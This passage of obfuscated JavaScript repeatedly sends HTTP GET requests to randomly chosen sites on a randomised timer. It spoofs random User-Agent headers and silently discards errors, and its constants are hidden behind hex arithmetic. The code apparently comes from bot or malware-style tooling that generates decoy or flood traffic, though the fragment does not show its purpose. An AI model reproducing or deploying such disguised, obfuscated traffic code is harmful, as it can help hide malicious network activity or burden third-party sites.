      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2154 + 0x3 * -0xf4d + -0x6a93 * -0x1) * getRandomInt(0x907 + -0xab1 + 0x1ab, 0x163 * 0x10 + 0x243a + 0x63 * -0x97));
}, -0x8b2 + 0x1 * -0x225f + -0x1 * -0x2b75);